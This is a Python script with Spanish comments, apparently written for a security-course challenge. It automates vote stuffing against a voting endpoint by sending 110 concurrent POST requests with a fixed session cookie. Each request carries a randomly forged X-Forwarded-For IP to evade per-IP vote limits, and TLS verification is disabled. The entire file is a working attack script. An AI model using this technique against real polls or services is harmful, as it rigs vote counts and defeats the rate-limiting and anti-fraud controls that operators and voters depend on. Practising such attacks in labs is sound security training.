import httpx
import asyncio
import random

# ✅ Configuración
URL = "https://chl-1073e42c-5c69-499c-87aa-9ac6115eef40-votacion-nueva-version.softwareseguro.com.ar/src/ctl/votacion.ctl.php"
PHPSESSID = "b3a97b91e1cc84e56b4422905728f716"  # tu sesión actual

TOTAL_VOTOS = 110 
CONCURRENCY = 10

# 🔧 Función para generar IPs falsas


def generar_ip_falsa():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# 🧾 Headers base


def construir_headers(ip_falsa):
    return {
        "Cookie": f"PHPSESSID={PHPSESSID};",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Origin": "https://chl-1073e42c-5c69-499c-87aa-9ac6115eef40-votacion-nueva-version.softwareseguro.com.ar",
        "Referer": "https://chl-1073e42c-5c69-499c-87aa-9ac6115eef40-votacion-nueva-version.softwareseguro.com.ar/",
        "X-Forwarded-For": ip_falsa
    }


data = {
    "opUniversidad": "1"
}

# 🚀 Función de envío de voto


async def enviar_voto(nro, client):
    ip_falsa = generar_ip_falsa()
    headers = construir_headers(ip_falsa)

    try:
        response = await client.post(URL, headers=headers, data=data, timeout=10.0)
        print(
            f"✅ Voto #{nro} desde IP {ip_falsa} - Status: {response.status_code}")
    except Exception as e:
        print(f"❌ Error en voto #{nro} desde IP {ip_falsa}: {e}")

# 🎯 Main async


async def main():
    sem = asyncio.Semaphore(CONCURRENCY)

    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = []

        for i in range(TOTAL_VOTOS):
            async def sem_task(n=i+1):
                async with sem:
                    await enviar_voto(n, client)
            tasks.append(sem_task())

        await asyncio.gather(*tasks)

# ▶️ Ejecutar
asyncio.run(main())
